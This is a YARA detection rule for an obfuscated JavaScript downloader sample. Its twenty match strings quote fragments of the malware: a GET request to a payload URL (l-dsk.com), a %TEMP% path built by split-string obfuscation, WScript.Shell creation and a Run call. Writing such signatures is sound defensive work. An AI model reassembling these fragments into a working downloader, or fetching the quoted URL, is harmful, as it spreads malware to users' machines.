rule sig_20160427_a98e4462129e90fc5fde87c6fc1d846f {
  meta:
    description = "datamaliciousorder - file 20160427_a98e4462129e90fc5fde87c6fc1d846f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2cf9312a74e84638962e917de8d8d0a73904a3cf5445d858166f5720894f9050"

  strings:
    $s1  = "SawwcPqkoe[VrjuxGyesk](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function SjznqHuxbp() {return ApowrSgphi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"AW7zJeK" ascii
    $s3  = "function SjznqHuxbp() {return ApowrSgphi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"AW7zJeK" ascii
    $s4  = "var ApowrSgphi = function XtemrCnyzr() {return RjmltBmeoh[VclnhXokfg](\"WScript\"+\".Shell\");}(), PgziwFmpor = 11;" fullword ascii
    $s5  = "function ImppdZoppo(TxsfcIywkf, IbifwDfwwq){PocraAioot = PocraAioot * 1; return TxsfcIywkf - IbifwDfwwq;};" fullword ascii
    $s6  = "var RjmltBmeoh = this[\"WScript\"];" fullword ascii
    $s7  = "if (SawwcPqkoe[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function EatroGwdkl(){return ThhvdCymzu + \"\";};" fullword ascii
    $s9  = "return ImppdZoppo(KvbffGfqan, RunwpJolhq);" fullword ascii
    $s10 = "function VjauzTdlgy() {return ((TwcxoTtknr == true) && (TwcxoTtknr == WqlqxGqcyg)) ? 1 : PocraAioot;};" fullword ascii
    $s11 = "var TwcxoTtknr = false;" fullword ascii
    $s12 = "WqlqxGqcyg = true; " fullword ascii
    $s13 = "var WqlqxGqcyg = false;" fullword ascii
    $s14 = "function TrgqaIpxin(){return 23;};" fullword ascii
    $s15 = "TwcxoTtknr = true; " fullword ascii
    $s16 = "}while (PhoqsUrrub);" fullword ascii
    $s17 = "var DzfmhAcvgl = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function FxlvxZhlnc(RjnuxPmvbb){ApowrSgphi[\"R\"+\"un\"](RjnuxPmvbb, PocraAioot, PocraAioot);};" fullword ascii
    $s19 = "function IilakYkyzp(){return VclnhXokfg;};" fullword ascii
    $s20 = "function PcixkBrcbn(ZrfrdRccvd) {var LjvmtDnaae = (1, 2, 3, 4, 5, ZrfrdRccvd); return LjvmtDnaae;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}